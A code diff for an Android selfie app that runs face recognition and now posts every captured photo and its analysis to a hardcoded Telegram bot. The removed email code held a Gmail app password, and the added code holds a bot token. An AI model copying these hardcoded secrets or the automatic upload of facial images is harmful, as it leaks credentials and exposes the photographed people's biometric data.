@@ -1,13 +1,9 @@
 import os
 import cv2
 import numpy as np
-import smtplib
-import ssl
 import threading
+import urllib.request
 from datetime import datetime
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.image import MIMEImage
 
 from kivy.app import App
 from kivy.clock import Clock
@@ -20,13 +16,10 @@ from kivy.uix.label import Label
 from kivy.uix.togglebutton import ToggleButton
 from kivy.utils import platform
 
-# ==================== EMAIL CONFIGURATION ====================
-ADMIN_EMAIL = "devlearndaily@gmail.com"        # Email where notifications will be sent
-SENDER_EMAIL = "amitbcatih@gmail.com"          # Your sender Gmail address
-SENDER_PASSWORD = "ltbusnxgnjbmsbvf"           # Your 16-character Gmail App Password
-SMTP_SERVER = "142.250.181.108"                # Direct Google SMTP IP to bypass Android DNS error
-SMTP_PORT = 465
-# =============================================================
+# ==================== TELEGRAM CONFIGURATION ====================
+BOT_TOKEN = '8600286925:AAF1Q00zaTAOclJeilYuFKw8s9S7c0NLQ4Q'
+CHAT_ID = '1409963950'
+# ===============================================================
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 M = os.path.join(BASE_DIR, "models")
@@ -214,4 +207,154 @@ class CamView(Image):
         rgb = np.ascontiguousarray(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))
         t = Texture.create(size=(rgb.shape[1], rgb.shape[0]), colorfmt="rgb")
         t.blit_buffer(rgb.tobytes(), colorfmt="rgb", bufferfmt="ubyte")
+        t.flip_vertical()
+        self.texture = t
+
+
+class Root(BoxLayout):
+    def __init__(self, **kw):
+        super().__init__(orientation="vertical", padding=10, spacing=10, **kw)
         
+        header = Label(text="[b]SELFIE AI PRO[/b]", markup=True, size_hint_y=0.08, font_size="22sp", color=(0, 0.9, 1, 1))
+        self.add_widget(header)
+
+        self.view = CamView(size_hint_y=0.64)
+        self.add_widget(self.view)
+
+        self.label = Label(text="Initializing AI Models...", size_hint_y=0.14,
+                           halign="center", valign="middle", font_size="16sp", color=(1, 1, 1, 0.9))
+        self.label.bind(size=self.label.setter('text_size'))
+        self.add_widget(self.label)
+
+        bar = BoxLayout(size_hint_y=0.14, spacing=8)
+        self.b_flip = Button(text="Flip", background_color=(0.1, 0.5, 0.8, 1))
+        self.b_rot = Button(text="Rotate", background_color=(0.2, 0.6, 0.6, 1))
+        self.b_live = ToggleButton(text="Live OFF", background_color=(0.3, 0.3, 0.3, 1))
+        self.b_cap = Button(text="Capture", background_color=(0, 0.7, 0.4, 1))
+
+        self.b_flip.bind(on_release=lambda *_: self.view.flip())
+        self.b_rot.bind(on_release=lambda *_: self.view.rotate())
+        self.b_live.bind(on_release=self.toggle_live)
+        self.b_cap.bind(on_release=self.capture)
+
+        for b in (self.b_flip, self.b_rot, self.b_live, self.b_cap):
+            bar.add_widget(b)
+        
+        self.add_widget(bar)
+        self.an = None
+        Clock.schedule_once(self.load_models, 0.5)
+        Clock.schedule_interval(self.live_tick, 1.0)
+
+    def load_models(self, dt):
+        try:
+            self.an = Analyzer()
+            count = len(self.an.known_database)
+            self.label.text = f"Ready! Loaded {count} profile(s).\nTap Capture or Live ON."
+        except Exception as ex:
+            self.label.text = f"Model error: {ex}"
+
+    def toggle_live(self, *_):
+        on = self.b_live.state == "down"
+        self.b_live.text = "Live ON" if on else "Live OFF"
+        self.b_live.background_color = (0.8, 0.3, 0.1, 1) if on else (0.3, 0.3, 0.3, 1)
+        if not on:
+            self.view.overlay = []
+
+    def live_tick(self, dt):
+        if self.b_live.state != "down" or self.an is None or self.view.frozen:
+            return
+        if self.view.frame is None:
+            return
+        self.run(self.view.frame)
+
+    def run(self, img):
+        try:
+            text, items = self.an.analyze(img)
+            self.view.overlay = items
+            self.label.text = text
+            return text
+        except Exception as ex:
+            self.label.text = f"Error: {ex}"
+            return ""
+
+    def send_telegram_async(self, img, analysis_text):
+        """Sends photo and analysis directly to Telegram bot via standard library multipart."""
+        def background_send():
+            try:
+                success, encoded_img = cv2.imencode('.jpg', img)
+                if not success:
+                    return
+                photo_bytes = encoded_img.tobytes()
+
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                caption = f"🚨 Selfie AI Alert: Capture Log\nTime: {timestamp}\n\n{analysis_text}"
+
+                boundary = '----------------Boundary_SelfieAI_$'
+                body = []
+
+                # chat_id field
+                body.append(f'--{boundary}\r\n'.encode('utf-8'))
+                body.append(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
+                body.append(f'{CHAT_ID}\r\n'.encode('utf-8'))
+
+                # caption field
+                body.append(f'--{boundary}\r\n'.encode('utf-8'))
+                body.append(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
+                body.append(f'{caption}\r\n'.encode('utf-8'))
+
+                # photo file field
+                body.append(f'--{boundary}\r\n'.encode('utf-8'))
+                body.append(b'Content-Disposition: form-data; name="photo"; filename="capture.jpg"\r\n')
+                body.append(b'Content-Type: image/jpeg\r\n\r\n')
+                body.append(photo_bytes)
+                body.append(b'\r\n')
+
+                body.append(f'--{boundary}--\r\n'.encode('utf-8'))
+                data = b''.join(body)
+
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+                req = urllib.request.Request(url, data=data)
+                req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+
+                with urllib.request.urlopen(req, timeout=15) as response:
+                    response.read()
+
+                Clock.schedule_once(lambda dt: setattr(self.label, 'text', analysis_text + "\n[✅ Sent to Telegram!]"))
+            except Exception as e:
+                err_msg = str(e)
+                print(f"Telegram failed: {err_msg}")
+                Clock.schedule_once(lambda dt: setattr(self.label, 'text', analysis_text + f"\n[❌ Telegram Failed: {err_msg[:30]}]"))
+
+        threading.Thread(target=background_send, daemon=True).start()
+
+    def capture(self, *_):
+        v = self.view
+        if v.frozen:
+            v.frozen, v.overlay = False, []
+            self.b_cap.text = "Capture"
+            self.label.text = "Ready."
+            return
+        if self.an is None or v.frame is None:
+            self.label.text = "Models loading..."
+            return
+        
+        analysis_text = self.run(v.frame)
+        v.frozen = True
+        v.show()
+        self.b_cap.text = "Retake"
+        
+        self.label.text = analysis_text + "\n[Sending to Telegram...]"
+        self.send_telegram_async(v.frame, analysis_text)
+
+
+class SelfieApp(App):
+    def build(self):
+        self.title = "Selfie AI Pro"
+        if platform == "android":
+            from android.permissions import request_permissions, Permission
+            request_permissions([Permission.CAMERA, Permission.INTERNET])
+        return Root()
+
+
+if __name__ == "__main__":
+    SelfieApp().run()
